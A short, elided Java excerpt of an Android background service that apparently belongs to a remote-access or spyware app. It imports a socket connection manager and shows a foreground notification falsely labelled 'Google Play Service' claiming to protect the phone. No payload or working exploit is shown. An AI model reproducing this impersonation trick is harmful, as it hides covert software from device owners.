...
import com.android.background.services.BuildConfig;
import com.android.background.services.socket.ConnectionManager;
...
public class MainService extends Service {
    ...
    public int onStartCommand(Intent intent, int flags, int startId) {
        ...
        Notification notification = notificationBuilder.setContentTitle("Google Play Service")
                .setContentText("Play Service is protecting your phone")
